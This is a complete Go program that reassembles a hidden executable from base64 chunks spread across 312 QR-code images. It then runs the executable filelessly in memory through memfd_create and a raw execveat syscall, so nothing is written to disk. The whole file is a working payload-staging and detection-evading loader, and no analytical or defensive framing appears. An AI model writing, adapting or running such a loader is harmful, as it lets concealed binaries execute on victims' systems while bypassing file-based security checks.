package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/base64"
	"fmt"
	"image"
	_ "image/png"
	_"io/ioutil"
	"os"
	"unsafe"
	
	"golang.org/x/sys/unix"

	"github.com/makiuchi-d/gozxing"
	"github.com/makiuchi-d/gozxing/qrcode"
)

// AT_EMPTY_PATH is the flag telling execveat to use the FD even if the path is "".
const AT_EMPTY_PATH = 0x1000

// decodeQRCode decodes a QR code from an image file and returns the decoded text.
func decodeQRCode(filename string) (string, error) {
	fmt.Println("Decoding QR code from file:", filename)
	file, err := os.Open(filename)
	if err != nil {
		return "", fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	img, _, err := image.Decode(file)
	if err != nil {
		return "", fmt.Errorf("failed to decode image: %w", err)
	}

	bmp, err := gozxing.NewBinaryBitmapFromImage(img)
	if err != nil {
		return "", fmt.Errorf("failed to create binary bitmap: %w", err)
	}

	qrReader := qrcode.NewQRCodeReader()
	result, err := qrReader.Decode(bmp, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decode QR code: %w", err)
	}

	fmt.Println("Successfully decoded QR code:", result.GetText())
	return result.GetText(), nil
}

// executeBinaryInMemory executes the given binary data in memory.
func executeBinaryInMemory(binaryData []byte) error {
	// Compute SHA-256 hash of the binary
	hash := sha256.Sum256(binaryData)
	hashHex := hex.EncodeToString(hash[:])
	fmt.Printf("SHA-256 of the binary: %s\n", hashHex)

	fmt.Printf("Executing binary in memory, size: %d bytes\n", len(binaryData))
	
	fd, err := unix.MemfdCreate("memexec", 0)
	if err != nil {
		return fmt.Errorf("MemfdCreate error: %v", err)
	}
	defer func() {
		fmt.Println("Closing memfd")
		unix.Close(fd)
	}()

	fmt.Println("Writing binary data to memfd")
	n, err := unix.Write(fd, binaryData)
	if err != nil || n != len(binaryData) {
		return fmt.Errorf("Write error: %v (wrote %d of %d)", err, n, len(binaryData))
	}
	fmt.Printf("Successfully wrote binary data (%d bytes) to memfd\n", n)

	fmt.Println("Seeking back to the beginning of memfd")
	if off, err := unix.Seek(fd, 0, 0); err != nil || off != 0 {
		return fmt.Errorf("Seek error: %v", err)
	}

	argv := []string{"memexec_binary"}
	envp := os.Environ()

	fmt.Println("Calling execveat with memfd")
	return execveatEmptyPath(fd, argv, envp)
}

// execveatEmptyPath calls execveat(fd, "", argv, envp, AT_EMPTY_PATH).
func execveatEmptyPath(fd int, argv []string, envp []string) error {
	fmt.Println("Preparing arguments and environment for execveat")
	argvPtrs := make([]*byte, len(argv)+1)
	for i, s := range argv {
		cstr, err := unix.BytePtrFromString(s)
		if err != nil {
			return fmt.Errorf("invalid argv string %q: %w", s, err)
		}
		argvPtrs[i] = cstr
	}

	envpPtrs := make([]*byte, len(envp)+1)
	for i, e := range envp {
		cstr, err := unix.BytePtrFromString(e)
		if err != nil {
			return fmt.Errorf("invalid env string %q: %w", e, err)
		}
		envpPtrs[i] = cstr
	}

	emptyStringPtr, _ := unix.BytePtrFromString("")

	const SYS_EXECVEAT = unix.SYS_EXECVEAT
	r1, _, e := unix.Syscall6(
		SYS_EXECVEAT,
		uintptr(fd),
		uintptr(unsafe.Pointer(emptyStringPtr)),
		uintptr(unsafe.Pointer(&argvPtrs[0])),
		uintptr(unsafe.Pointer(&envpPtrs[0])),
		uintptr(AT_EMPTY_PATH),
		0,
	)
	if e != 0 {
		return fmt.Errorf("execveat syscall error: %v", e)
	}
	if r1 != 0 {
		return fmt.Errorf("execveat returned %d unexpectedly", r1)
	}
	fmt.Println("execveat call completed successfully")
	return nil
}

func main() {
	imageDir := "./img"
	fmt.Println("Reading images from directory:", imageDir)

	var combinedBase64 string
	for i := 1; i <= 312; i++ { // Loop from 1 to 312
		imagePath := fmt.Sprintf("%s/finalattempt_%d.png", imageDir, i) // Construct file names starting from "finalattempt_1.png"
		fmt.Println("Processing file:", imagePath)

		decodedPart, err := decodeQRCode(imagePath)
		if err != nil {
			fmt.Printf("Error decoding QR code %s: %v\n", imagePath, err)
			return
		}
		fmt.Printf("Decoded part from %s: %s\n", imagePath, decodedPart)
		combinedBase64 += decodedPart
	}

	// Save combined base64 for debugging
	// err := ioutil.WriteFile("/tmp/combined_base64.txt", []byte(combinedBase64), 0644)
	// if err != nil {
	// 	fmt.Println("Error saving combined base64:", err)
	// 	return
	// }
	// fmt.Println("Combined base64 written to /tmp/combined_base64.txt")

	decodedBytes, err := base64.StdEncoding.DecodeString(combinedBase64)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
		return
	}
	fmt.Printf("Decoded binary data size: %d bytes\n", len(decodedBytes))

	// Save the binary for verification
	// err = os.WriteFile("/tmp/reconstructed_binary", decodedBytes, 0755)
	// if err != nil {
	// 	fmt.Println("Error saving reconstructed binary:", err)
	// 	return
	// }
	// fmt.Println("Reconstructed binary saved to /tmp/reconstructed_binary")

	// Compute and log SHA-256 of the binary
	hash := sha256.Sum256(decodedBytes)
	hashHex := hex.EncodeToString(hash[:])
	fmt.Printf("SHA-256 of reconstructed binary: %s\n", hashHex)

	// Attempt to execute the binary
	fmt.Println("Executing binary in memory")
	err = executeBinaryInMemory(decodedBytes)
	if err != nil {
		fmt.Println("Error executing binary in memory:", err)
		return
	}

	fmt.Println("Binary executed successfully in memory.")
}



